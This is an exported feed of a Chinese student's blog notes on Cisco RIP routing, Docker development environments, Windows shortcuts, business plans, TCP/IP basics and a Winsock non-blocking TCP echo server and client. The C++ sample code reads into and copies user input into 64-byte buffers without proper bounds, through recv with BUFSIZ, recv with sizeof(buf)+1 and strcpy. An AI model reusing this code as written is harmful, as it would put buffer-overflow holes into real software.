title="配置被动接口"></a>配置被动接口</h3><p>默认情况下，将 RIP 更新从所有启用 RIP 的接口发出。使用 <strong>passive-interface</strong> 路由器配置命令阻止通过路由器接口传输路由更新，但是仍然允许将该网络通告至其他路由器。该命令会停止指定接口的路由更新。但是，从其他接口发出的路由更新中仍通告指定接口所属的网络。可以使用 <strong>passive-interface default</strong> 命令将所有接口设为被动。不能设为被动的接口可以使用 <strong>no passive-interface</strong> 命令重新启用。</p><blockquote><p>router rip</p><p>passive-interface g0/0</p><p>end</p></blockquote><blockquote><p>传播默认路由</p><p>边缘路由器必须配置：</p><ul><li><p>使用 <strong>ip route 0.0.0.0 0.0.0.0</strong> 命令的默认静态路由。</p></li><li><p><strong>default-information originate</strong> 路由器配置命令。这会指导 R1 通过在 RIP 更新中传播静态默认路由来产生默认信息。</p></li></ul><p>在一个单出口网络内启用RIP协议，在网络出口处的路由器需要向RIP域内传播一条默认路由，这样，域内的路由器就可以通过默认路由访问外部网络。下面我们就用试验来模拟这个环境。到目前为止；通过RIP传递默认路由共有5种方法。<br>1 default-information<br>2 手工写一条默认路由（到NULL0） 然后重分布到RIP中<br>3 手工写一条默认路由（到NULL0）在进程中宣告<br>4 ip default-network<br>5在接口汇总0.0.0.0/0到NULL0的路由</p></blockquote><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200331115232904.png" srcset="/img/loading.gif" class="" title="image-20200331115232904"><h2 id="考题记录"><a href="#考题记录" class="headerlink" title="考题记录"></a>考题记录</h2><blockquote><p>ospf管理距离为110</p></blockquote><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303201755734.png" srcset="/img/loading.gif" class="" title="image-20200303201755734"><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303202527458.png" srcset="/img/loading.gif" class="" title="image-20200303202527458"><p>DNS 53端口 即是UDP也是TCP</p><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200326091219029.png" srcset="/img/loading.gif" class="" title="image-20200326091219029"><blockquote><p>What happens to a static route entry in a routing table when the outgoing interface is not available?<br><strong>The route is removed from the table.</strong></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用好用的快捷键（Win）</title>
    <link href="/2020/03/25/%E5%B8%B8%E7%94%A8%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BF%AB%E6%8D%B7%E9%94%AE%EF%BC%88Win%EF%BC%89/"/>
    <url>/2020/03/25/%E5%B8%B8%E7%94%A8%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BF%AB%E6%8D%B7%E9%94%AE%EF%BC%88Win%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="常用好用的快捷键（Win）"><a href="#常用好用的快捷键（Win）" class="headerlink" title="常用好用的快捷键（Win）"></a>常用好用的快捷键（Win）</h1><p><strong>写下来新发现的/有需求之后找到的快捷键，希望对各位有帮助</strong></p><h2 id="全局（存疑）"><a href="#全局（存疑）" class="headerlink" title="全局（存疑）"></a>全局（存疑）</h2><h3 id="软件窗口切换"><a href="#软件窗口切换" class="headerlink" title="软件窗口切换"></a>软件窗口切换</h3><p>自由控制方向<code>alt + 方向</code></p><p>依次切换<code>alt + tab</code></p><h3 id="选择已输入的"><a href="#选择已输入的" class="headerlink" title="选择已输入的"></a>选择已输入的</h3><p><code>shift + ←/→方向键</code></p><h2 id="游览器"><a href="#游览器" class="headerlink" title="游览器"></a>游览器</h2><h3 id="恢复关闭的页面-隐私模式下无用"><a href="#恢复关闭的页面-隐私模式下无用" class="headerlink" title="恢复关闭的页面(隐私模式下无用)"></a>恢复关闭的页面(隐私模式下无用)</h3><p><code>ctrl + shift + t</code></p><h3 id="页面切换"><a href="#页面切换" class="headerlink" title="页面切换"></a>页面切换</h3><p>顺序切换<code>ctrl + tab</code></p><p>倒叙<code>ctrl + shift + tab</code></p><h3 id="关闭当前页面"><a href="#关闭当前页面" class="headerlink" title="关闭当前页面"></a>关闭当前页面</h3><p><code>ctrl + w</code></p><h2 id="Vs-code"><a href="#Vs-code" class="headerlink" title="Vs code"></a>Vs code</h2><p>随时可能更新qwq</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker隔离开发环境和宿主</title>
    <link href="/2020/03/18/docker%E9%9A%94%E7%A6%BB%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%92%8C%E5%AE%BF%E4%B8%BB/"/>
    <url>/2020/03/18/docker%E9%9A%94%E7%A6%BB%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%92%8C%E5%AE%BF%E4%B8%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="docker隔离开发环境和宿主"><a href="#docker隔离开发环境和宿主" class="headerlink" title="docker隔离开发环境和宿主"></a>docker隔离开发环境和宿主</h1><p>如何把开发环境移到docker里？</p><p>目前设想了有：通过scp传数据，来让宿主机知道docker里安装了啥包。然后对应自动生成dockerfile。通过vscode remote。</p><p>基础镜像，是一开始自己也不知道需要什么包的,所以直接装在镜像里,然后通过python来检测docker里安装了啥东西，再传出来到宿主机补充到dockerfile/自动安装包脚本里。至于开发的文件，git和云同步都挺好。真正做到开发完就丢环境                                 </p><p>补充调查：</p><ul><li><p>docker镜像可以拷贝到u盘上。<a href="https://blog.csdn.net/nimei31/article/details/80716573" target="_blank" rel="noopener">link</a></p></li><li><p>vscode remote 远程开发 <a href="https://www.cnblogs.com/tinywan/p/11107397.html" target="_blank" rel="noopener">link</a> 主机安装ssh-server，本地安装ssh-client，vscode安装remote development</p></li><li><p><a href="https://www.cnblogs.com/mengw/p/11413461.html" target="_blank" rel="noopener">https://www.cnblogs.com/mengw/p/11413461.html</a>)</p></li></ul><h2 id="本机"><a href="#本机" class="headerlink" title="本机"></a>本机</h2><ul><li><p><a href="https://github.com/Microsoft/vscode-remote-try-python" target="_blank" rel="noopener">下载</a></p></li><li><p><a href="https://code.visualstudio.com/docs/remote/containers#_getting-started" target="_blank" rel="noopener">跟随</a></p></li></ul><p>然后等待下载完就可以了</p><h2 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h2><p><a href="https://code.visualstudio.com/docs/remote/containers-advanced#_developing-inside-a-container-on-a-remote-docker-host" target="_blank" rel="noopener">https://code.visualstudio.com/docs/remote/containers-advanced#_developing-inside-a-container-on-a-remote-docker-host</a></p><p>项目搬迁的时候，需要把当前的环境依赖包导出，然后到部署项目的服务器上安装依赖。 我们可以通过下面的命令执行，把依赖包导出到requirements.txt文件里。 生成requirements.txt</p><pre><code>pip freeze &gt; requirements.txt</code></pre><p>安装requirements.txt依赖</p><pre><code>pip install -r requirements.txt</code></pre><p><a href="https://www.django.cn/forum/forum-10.html" target="_blank" rel="noopener">原文</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker</title>
    <link href="/2020/03/16/docker/"/>
    <url>/2020/03/16/docker/</url>
    
    <content type="html"><![CDATA[<h1 id="docker记录"><a href="#docker记录" class="headerlink" title="docker记录"></a>docker记录</h1><h2 id="群里介绍截图"><a href="#群里介绍截图" class="headerlink" title="群里介绍截图"></a>群里介绍截图</h2><img src="2020/03/16/docker/image-20200309201430966.png" srcset="/img/loading.gif" class="" title="image-20200309201430966"><img src="2020/03/16/docker/image-20200309201729975.png" srcset="/img/loading.gif" class="" title="image-20200309201729975"><img src="2020/03/16/docker/image-20200309202211814.png" srcset="/img/loading.gif" class="" title="image-20200309202211814"><img src="2020/03/16/docker/image-20200309202523127.png" srcset="/img/loading.gif" class="" title="image-20200309202523127"><img src="2020/03/16/docker/image-20200309202550963.png" srcset="/img/loading.gif" class="" title="image-20200309202550963"><img src="2020/03/16/docker/image-20200309203036752.png" srcset="/img/loading.gif" class="" title="image-20200309203036752"><img src="2020/03/16/docker/image-20200309203235771.png" srcset="/img/loading.gif" class="" title="image-20200309203235771"><p>2375:默认端口</p><img src="2020/03/16/docker/image-20200309203741638.png" srcset="/img/loading.gif" class="" title="image-20200309203741638"><p>不过root权限免密登录的是容器</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>进入<code>docker exec -it ID /bin/bash</code></p><p>查看一下本地的镜像，运行<code>docker images</code></p><p>docker中删除images的命令是<code>docker rmi</code>(此时要求那个没有container在运行才会正确删除)</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</p><p>我的做法是卸载重装= =</p><p><a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/#uninstall-docker-ce" target="_blank" rel="noopener">安装</a></p><p><a href="https://blog.csdn.net/wireless911/article/details/88989620" target="_blank" rel="noopener">Unable to find image ‘hello-world:latest’ locally）</a></p><img src="2020/03/16/docker/image-20200316015938550.png" srcset="/img/loading.gif" class="" title="image-20200316015938550">]]></content>
    
    
    <categories>
      
      <category>技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>技术学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>商业计划书撰写及案例分析</title>
    <link href="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/"/>
    <url>/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="商业计划书撰写及案例分析"><a href="#商业计划书撰写及案例分析" class="headerlink" title="商业计划书撰写及案例分析"></a>商业计划书撰写及案例分析</h1><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154014932.png" srcset="/img/loading.gif" class="" title="image-20200303154014932"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154629436.png" srcset="/img/loading.gif" class="" title="image-20200303154629436"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154857510.png" srcset="/img/loading.gif" class="" title="image-20200303154857510"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155013709.png" srcset="/img/loading.gif" class="" title="image-20200303155013709"><p>1，2页，最多3</p><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155045603.png" srcset="/img/loading.gif" class="" title="image-20200303155045603"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155143295.png" srcset="/img/loading.gif" class="" title="image-20200303155143295"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155249332.png" srcset="/img/loading.gif" class="" title="image-20200303155249332"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155614678.png" srcset="/img/loading.gif" class="" title="image-20200303155614678"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155819865.png" srcset="/img/loading.gif" class="" title="image-20200303155819865"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160141607.png" srcset="/img/loading.gif" class="" title="image-20200303160141607"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160544258.png" srcset="/img/loading.gif" class="" title="image-20200303160544258"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160634611.png" srcset="/img/loading.gif" class="" title="image-20200303160634611"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161012399.png" srcset="/img/loading.gif" class="" title="image-20200303161012399"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161050235.png" srcset="/img/loading.gif" class="" title="image-20200303161050235"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161219645.png" srcset="/img/loading.gif" class="" title="image-20200303161219645"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161303272.png" srcset="/img/loading.gif" class="" title="image-20200303161303272"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161514149.png" srcset="/img/loading.gif" class="" title="image-20200303161514149"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303165428331.png" srcset="/img/loading.gif" class="" title="image-20200303165428331"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306103106419.png" srcset="/img/loading.gif" class="" title="image-20200306103106419"><p>分析竞争对手 深入详细 长远目标，现行战略，产品趋势</p><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306103921594.png" srcset="/img/loading.gif" class="" title="image-20200306103921594"><p>分析优劣，内外部威胁，外部机会与内部因素相匹配</p><h2 id="评审要点"><a href="#评审要点" class="headerlink" title="评审要点"></a>评审要点</h2><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306182110048.png" srcset="/img/loading.gif" class="" title="image-20200306182110048"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306182240857.png" srcset="/img/loading.gif" class="" title="image-20200306182240857"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306190639540.png" srcset="/img/loading.gif" class="" title="image-20200306190639540"> <img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306192421339.png" srcset="/img/loading.gif" class="" title="image-20200306192421339"><img src="2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306193534013.png" srcset="/img/loading.gif" class="" title="image-20200306193534013"><p>痛点-&gt;解决方案-&gt;证明正确-&gt;商业模式-&gt;市场分析、竞争对手-&gt;商业模式-&gt;取得的成效-&gt;团队，财务，未来</p><p>词汇不要过于专业，也不要太low</p><p>盲审：不涉及产品，拿出数据化的东西</p><p>路演：项目背景，痛点</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>网络编程</title>
    <link href="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <url>/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h1><h2 id="3-9"><a href="#3-9" class="headerlink" title="3/9"></a>3/9</h2><img src="2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200309113441335.png" srcset="/img/loading.gif" class="" title="image-20200309113441335"><img src="2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200309113925329.png" srcset="/img/loading.gif" class="" title="image-20200309113925329"><p>非阻塞模式</p><pre><code class="c++">// TcpServer.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;WINSOCK2.H&gt;   #include &lt;iostream&gt;#pragma comment(lib,&quot;WS2_32.lib&quot;)   #define BUF_SIZE    64      // 缓冲区大小int _tmain(int argc, _TCHAR* argv[]){    WSADATA wsd;                    // WSADATA变量，用于初始化Windows Socket       SOCKET  sServer;                    // 服务器套接字，用于监听客户端请求    SOCKET  sClient;                    // 客户端套接字，用于实现与客户端的通信       int     retVal;                        // 调用各种Socket函数的返回值       char    buf[BUF_SIZE];            // 用于接受客户端数据的缓冲区       // 初始化套接字动态库       if(WSAStartup(MAKEWORD(2,2),&amp;wsd) != 0)       {           printf(&quot;WSAStartup failed !\n&quot;);           return 1;       }         // 创建用于监听的套接字       sServer = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);       unsigned long iMode = 1;    retVal = ioctlsocket(sServer, FIONBIO, &amp;iMode);    if(INVALID_SOCKET == sServer)       {           printf(&quot;socket failed !\n&quot;);           WSACleanup();           return -1;       }         // 设置服务器套接字地址       SOCKADDR_IN addrServ;       addrServ.sin_family = AF_INET;       addrServ.sin_port = htons(9990);        // 监听端口为9990    addrServ.sin_addr.S_un.S_addr = htonl(INADDR_ANY);        // 绑定套接字sServer到本地地址，端口9990      retVal = bind(sServer,(const struct sockaddr*)&amp;addrServ,sizeof(SOCKADDR_IN));       if(SOCKET_ERROR == retVal)       {           printf(&quot;bind failed !\n&quot;);           closesocket(sServer);           WSACleanup();           return -1;       }         // 监听套接字       retVal = listen(sServer,1);       if(SOCKET_ERROR == retVal)       {           printf(&quot;listen failed !\n&quot;);           closesocket(sServer);           WSACleanup();           return -1;       }         // 接受客户请求       printf(&quot;TCP Server start...\n&quot;);    sockaddr_in addrClient;                            // 客户端地址    int addrClientlen = sizeof(addrClient);       while (true)    {        sClient = accept(sServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientlen);        if (INVALID_SOCKET == sClient)        {            int err = WSAGetLastError();            if (err == WSAEWOULDBLOCK)            {                Sleep(100);                continue;            }            else            {                printf(&quot;accept failed!\n&quot;);                closesocket(sServer);                WSACleanup();                return -1;            }        }        break;    }    // 循环接收客户端的数据，直接客户端发送quit命令后退出。      while(true)    {        ZeroMemory(buf,BUF_SIZE);                        // 清空接收数据的缓冲区        retVal = recv(sClient,buf,BUFSIZ,0);                //         if(SOCKET_ERROR == retVal )           {               int err = WSAGetLastError();            if (err == WSAEWOULDBLOCK)            {                Sleep(100);                continue;            }            else if (err == WSAETIMEDOUT || err == WSAENETDOWN)            {                printf(&quot;recv failed!\n&quot;);                closesocket(sServer);                closesocket(sClient);                WSACleanup();                return -1;            }        }         if (buf == NULL)            continue;        // 获取当前系统时间        SYSTEMTIME st;        GetLocalTime(&amp;st);        char sDateTime[30];        sprintf(sDateTime, &quot;%4d-%2d-%2d %2d:%2d:%2d&quot;,st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);        // 打印输出的信息        printf(&quot;%s, Recv From Client [%s:%d] :%s\n&quot;, sDateTime, inet_ntoa(addrClient.sin_addr), addrClient.sin_port, buf);           // 如果客户端发送quit字符串，则服务器退出        if(strcmp(buf, &quot;quit&quot;) == 0)        {            retVal = send(sClient,&quot;quit&quot;,strlen(&quot;quit&quot;),0);               break;        }        else        // 否则向客户端发送回显字符串        {            char    msg[BUF_SIZE];              sprintf(msg, &quot;Message received - %s&quot;, buf);             retVal = send(sClient, msg, strlen(msg),0);               if(SOCKET_ERROR == retVal)               {                      printf(&quot;send failed !\n&quot;);                    closesocket(sServer);                      closesocket(sClient);                      WSACleanup();                      return -1;               }           }    }    // 释放套接字       closesocket(sServer);       closesocket(sClient);       WSACleanup();       // 暂停，按任意键退出    system(&quot;pause&quot;);    return 0;}</code></pre><pre><code class="c++">// TcpClient.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;Winsock2.H&gt;   #include &lt;string&gt;#include &lt;iostream&gt;#pragma comment(lib,&quot;WS2_32.lib&quot;)   #define BUF_SIZE    64          // 缓冲区大小  int _tmain(int argc, _TCHAR* argv[]){    WSADATA     wsd;                    // 用于初始化Windows Socket       SOCKET      sHost;                    // 与服务器进行通信的套接字       SOCKADDR_IN servAddr;            // 服务器地址       char        buf[BUF_SIZE];            // 用于接受数据缓冲区       int         retVal;                            // 调用各种Socket函数的返回值       // 初始化Windows Socket    if(WSAStartup(MAKEWORD(2,2),&amp;wsd) != 0)       {           printf(&quot;WSAStartup failed !\n&quot;);           return 1;       }         // 创建套接字       sHost = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);       if(INVALID_SOCKET == sHost)       {           printf(&quot;socket failed !\n&quot;);           WSACleanup();           return -1;       }        // 设置服务器地址       servAddr.sin_family = AF_INET;       servAddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);        // 用户需要根据实际情况修改    servAddr.sin_port = htons(9990);                                                    // 在实际应用中，建议将服务器的IP地址和端口号保存在配置文件中    int sServerAddlen = sizeof(servAddr);                                                // 计算地址的长度           // 连接服务器       while (true)    {        retVal = connect(sHost, (LPSOCKADDR)&amp;servAddr, sizeof(servAddr));        if (SOCKET_ERROR == retVal)        {            int err = WSAGetLastError();            if (err == WSAEWOULDBLOCK || err == WSAEINVAL)            {                Sleep(500);                continue;            }            else if (err == WSAEISCONN)            {                break;            }            else            {                printf(&quot;connect failed !\n&quot;);                closesocket(sHost);                WSACleanup();                return -1;            }        }    }    // 循环向服务器发送字符串，并显示反馈信息。    // 发送quit将使服务器程序退出，同时客户端程序自身也将退出    while(true)    {        // 向服务器发送数据           printf(&quot;Please input a string to send: &quot;);        // 接收输入的数据        std::string str;        std::getline(std::cin, str);        // 将用户输入的数据复制到buf中        ZeroMemory(buf,BUF_SIZE);           strcpy(buf,str.c_str());           if(buf[0]==&#39;\0&#39;)            continue;        // 向服务器发送数据        while (true)        {            retVal = send(sHost, buf, strlen(buf), 0);            //retVal = WSASend(sHost, buf, BUF_SIZE, strlen(buf),0,NULL,NULL);            if (SOCKET_ERROR == retVal)            {                int err = WSAGetLastError();                if (err == WSAEWOULDBLOCK)                {                    Sleep(500);                    continue;                }                else                {                    printf(&quot;send failed!\n&quot;);                    closesocket(sHost);                    WSACleanup();                    return -1;                }            }            break;        }        // 接收服务器回传的数据          while (true)        {            ZeroMemory(buf, BUF_SIZE);            retVal = recv(sHost, buf, sizeof(buf) + 1, 0);            if (SOCKET_ERROR == retVal)            {                int err = WSAGetLastError();                if (err == WSAEWOULDBLOCK)                {                    Sleep(100);                    printf(&quot;waiting back msg!\n&quot;);                    continue;                }                else if (err == WSAETIMEDOUT || err == WSAENETDOWN)                {                    printf(&quot;recv failed!\n&quot;);                    closesocket(sHost);                    WSACleanup();                    return -1;                }                break;            }            break;        }        printf(&quot;Recv From Server: %s\n&quot;,buf);           // 如果收到quit，则退出        if(strcmp(buf, &quot;quit&quot;) == 0)        {            printf(&quot;quit!\n&quot;);            break;        }    }    // 释放资源       closesocket(sHost);       WSACleanup();       // 暂停，按任意键继续    system(&quot;pause&quot;);    return 0;  }</code></pre><h2 id="3-23"><a href="#3-23" class="headerlink" title="3/23"></a>3/23</h2><img src="2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200323111552979.png" srcset="/img/loading.gif" class="" title="image-20200323111552979"><img src="2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200323113425859.png" srcset="/img/loading.gif" class="" title="image-20200323113425859"><h2 id="3-30"><a href="#3-30" class="headerlink" title="3/30"></a>3/30</h2><img src="2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140139366.png" srcset="/img/loading.gif" class="" title="image-20200330140139366"><p>阻塞：适合通信量较少的简单应用，没有完成之前不会返回</p><p>非阻塞:并发强</p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><img src="2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140556146.png" srcset="/img/loading.gif" class="" title="image-20200330140556146"><img src="2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140713774.png" srcset="/img/loading.gif" class="" title="image-20200330140713774"><img src="2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200330140911046.png" srcset="/img/loading.gif" class="" title="image-20200330140911046">]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCPIP复习</title>
    <link href="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/"/>
    <url>/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="遗忘记录"><a href="#遗忘记录" class="headerlink" title="遗忘记录"></a>遗忘记录</h1><h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><p>A类地址 公有1~126 </p><table><thead><tr><th align="center">地址类型</th><th align="center">公有</th><th align="center">私有</th></tr></thead><tbody><tr><td align="center">A类</td><td align="center">1 ~ 126</td><td align="center">10.0.0.0 ~ 10.255.255.255</td></tr><tr><td align="center">B类</td><td align="center">128 ~ 191</td><td align="center">172.16.0.0 ~ 172.31.255.255</td></tr><tr><td align="center">C类</td><td align="center">192.0.0.0 ~ 223.255.255.255</td><td align="center">192.168.0.0 ~ 192.168.255.255</td></tr></tbody></table><h2 id="直接交付和间接交付"><a href="#直接交付和间接交付" class="headerlink" title="直接交付和间接交付"></a>直接交付和间接交付</h2><p>直接交付 -&gt; 交给同一个网络地址</p><p>间接交付 -&gt; 经过一个直接交付，给路由器，再给路由器 直到到达同一个网络的路由再给主机</p><h2 id="端到端和点到点"><a href="#端到端和点到点" class="headerlink" title="端到端和点到点"></a>端到端和点到点</h2><p>端到端 -&gt; 进程到进程</p><p>点到点 -&gt; 设备到设备</p><h2 id="三元组五元组"><a href="#三元组五元组" class="headerlink" title="三元组五元组"></a>三元组五元组</h2><p>三元组：协议，IP地址，端口</p><p>五元组：三元 + 源IP，源端口</p><h3 id="TCP-可靠性"><a href="#TCP-可靠性" class="headerlink" title="TCP 可靠性"></a>TCP 可靠性</h3><ul><li>流量控制：滑动窗口 } 发送窗口</li><li>拥塞控制： 拥塞窗口 重转定时器</li><li>差错控制</li></ul><h3 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h3><ul><li>流套接字：TCP 适合大量数据 单播</li><li>数据报套接字： UDP</li><li>原始套接字：编写自定底层协议</li></ul><h3 id="IP多播"><a href="#IP多播" class="headerlink" title="IP多播"></a>IP多播</h3><p>==五个前提？==</p><p>多播地址 224.0.0.0 ~ 239.255.255.255</p><p>IP地址的低23位替换mac地址低23位，第24位为0</p><h1 